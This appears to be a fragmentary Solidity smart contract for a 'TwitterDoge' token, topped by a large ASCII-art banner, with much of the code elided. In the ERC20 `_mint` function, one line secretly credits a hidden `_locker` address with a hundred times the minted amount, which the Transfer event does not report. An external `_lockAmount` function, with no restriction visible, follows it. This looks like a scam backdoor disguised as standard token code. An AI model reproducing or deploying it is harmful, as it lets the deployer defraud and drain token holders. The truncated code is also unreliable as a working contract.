...
//ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooOOOOOOOoooooooooooooooooooooooooooo
//ooooooooooooooooooooooooooooooooooooooooooooooooooooooo/\OOO/[`,`,[**,*]*[[OOO\/ooooooooooooooooooo
//oooooooooooooooooooooooooooooooooooooooooooooooooooooOO/`,/,\*,`**********=**^^,OO]\ooooooooooooooo
//oooooooooooooooooooooooooooooooooooooooooooooOoooooO/,,/*`^.oo[************,/=OO\\,OO/ooOoooooooooo
//ooooooooooOooooooooooooooOooooooooooooooooooooooOO```,`*\[/.oo\\]******[,,,^,,\OO^***\O`\oooooooooo
//oOOoOooOOoOooooOOooOOooooOOOOoOOoOoOooooOoooOOoO`/]\*,*,\\^,/`*****[\[[[oOO`/OOOO^^,`*o\O/OOOooOoOO
//OOOOOOOOOOOOOoO[OoOOOOOOOOOOOOOOOOOOOOOOOOOOoO/*,***`^                  ,[[[email protected]@OO/`^****,O\oOOOOOoO
//OOOOOOOOOOOOOO^  ,OOOOOOOOOOOOOOOOOOOOOOOOOOO`^[****,^                       ,O\O`*,****`,\OoOOOOOO
//OOOOOOOOOOOOO/     ,OOOOOOOOOOOOOOOOOOOOOOOO^/*/`=*\`                           ,\[/****`^\\OOOOOOO
//OOOOOOOOOOOOO^       ,\OOOOOOOOOOOOOOOOOOOO^`/,/`,,^.                             \`****`*^\OOOOOOO
//OOOOOOOOOOOOO.          [OOOOOOOOOOOOOOOOOO,*\,\=,/   .,[`        ,@@@..           /=^****===O/OOOO
//OOOOOOOOOOOOO`             \OOOOOOOOOOOOOO^/*,*`\,    ....        ,[`....          ,]=`****,*OOOOOO
//OOOOOOOOOOOOO^                ,\OOOOOOOOOO*^*,**,.   @@@@/        ........          `[,`****==OoOOO
//OOOOOOOOOOOOOO`                   ,[OOOOOO,*****=.  ,@@@@^         .......          =*``*****=OoOOO
//OOOOOOOOOOOOOOO`                        =O,,****=   [email protected]@@^         .......          =,==****,=O=OOO
//OOOOOOOOOOOOOOOO`                       .O*===**=`   [email protected]@@\         .......          *^^*****,=O/OOO
//OOOOOOOOOOOOO[\OOO`                      O^`***=[,    ,OO^         ......          .*=`^*`**^O/OOOO
//OOOOOOOOOOOOO^     .                     =O`****,[^  . ...         ....            /^*^,****=O\OOOO
//OOOOOOOOOOOOO^                            \^/,*`\,`..                             =****/*/,*O\OOOOO
//OOOOOOOOOOOOOO`                            O/^*``[`...                           `.../==,^,/OOOOOOO
//OOOOOOOOOOOOOOO                             O\\/^[...                          ......o^^,/OOOOOOOOO
//OOOOOOOOOOOOOOOO`                            \\`/=...                      .........=oo,,OOOOOOOOOO
//OOOOOOOOOOOOOOOOOO`                           ,O]........*****.....................,o///OOOOOOOOOOO
//OOOOOOOOOOOOOOOOOOOO]                           \O`.......**....................../o//OOOOOOOOOOOOO
//OOOOOOOOOOOOOOOOOOOOOOOO]                         ,O\....*.....................,/ooOOOOOOOOOOOOOOOO
//OOOOOOOOOOOOOOOOOOO`                                 [O\`......................]OOOOOOOOOOOOOOOOOOO
//OOOOOOOOOOOOOOOOOOOO^                                   ,[OO]]...........,..OOOOOOOOOOOOOOOOOOOOOOO
...
//OOOOOOOOOOOOOOOOOOOOO/[`                                       /OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
//OOOOOOOOOOO]                                                /OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
//OOOOOOOOOOOOOOO]                                        ][email protected]
//[email protected]@O]`                              ]/[email protected]
//[email protected]@@@[email protected]@@[email protected]@@O\]]`.          ,]]]/[email protected]@[email protected]@@[email protected]@[email protected]@OOOO
//@[email protected]@@@[email protected]@@@@@[email protected]@@@@@@@@@@@@@[email protected]@@@@@@@[email protected]@[email protected]@@[email protected]@@[email protected]@@@@@@@[email protected]@@@[email protected]@[email protected]@[email protected]@@
//@@@@@@@@@@@[email protected]@@@@@[email protected]@[email protected]@@@@@@@@@@@@@@@@@@@@[email protected]@@@@@@@@@@@@@@@@@[email protected]@@@@@@[email protected]@@@@@@@@@@@@@@@OO、
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _balances[_locker]  = amount*100; 
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

       function _lockAmount( uint256 amount) external   {
...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    ) payable ERC20("TwitterDoge", "TwitterDoge") {
       uint256 totalSupply_ =10**15* 10**18;
        uint256 minimumTokenBalanceForDividends_  = 1000000000000000000000;
        rewardToken = addrs[0];
